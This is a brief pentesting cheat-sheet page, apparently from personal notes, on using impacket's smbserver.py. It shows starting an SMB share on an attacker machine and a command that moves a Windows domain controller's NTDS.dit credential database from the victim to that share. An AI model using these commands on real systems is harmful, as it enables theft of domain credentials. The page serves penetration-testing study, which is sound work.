---
title: smbserver - from impacket
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting windows 
  - server
  - impacket
---

# smbserver - from impacket

Simple SMB Server example. [See impacket](impacket.md).


## Installation

Download from: [https://github.com/fortra/impacket/blob/master/examples/smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)


## Basic usage


Launch smbserver in our attacker machine:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/
```

Now, from PS in the victim's windows machine we could upload a folder to the shared folder in the attacker machine just by running:

```powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\$ip\CompData
```
